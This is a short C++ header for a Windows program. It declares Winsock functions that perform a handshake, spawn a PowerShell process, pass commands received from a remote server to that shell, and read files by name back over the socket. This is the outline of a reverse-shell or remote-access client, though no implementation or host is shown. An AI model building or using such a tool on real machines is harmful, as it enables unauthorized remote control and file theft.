#pragma once
//how to include winsock2: https://stackoverflow.com/questions/11726958/cant-include-winsock2-h-in-msvc-2010


#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")


bool initWSA();

//a little check before opening the shell
bool performHandshake(SOCKET s);

//create a new powershell process
bool spawnPowerShell(SOCKET s);

//receive powershell commands from the server and pass them to powershell
bool communicatePowerShell(SOCKET s);

//release all process and pipe handles
void cleanUp();

//get file content by name
bool getFileContent(SOCKET s, char* filename);